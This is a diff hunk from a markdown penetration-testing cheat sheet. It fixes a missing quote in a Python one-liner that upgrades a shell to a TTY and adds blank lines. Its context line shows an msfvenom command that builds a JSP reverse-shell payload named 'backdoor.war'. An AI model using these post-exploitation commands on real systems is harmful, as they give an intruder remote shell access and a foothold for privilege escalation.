@@ -144,13 +144,20 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4449 -f war > backdoor.war
 ```
 
 
+
+
 ## Attempt to Elevate permissions after entry
+
+
+
 
 ### Upgrade Shell to TTY
 
 ```
-python -c 'import pty;pty.spawn("/bin/bash")
+python -c 'import pty;pty.spawn("/bin/bash")'
 ```
+
+
 
 ### Download file to remote host
 
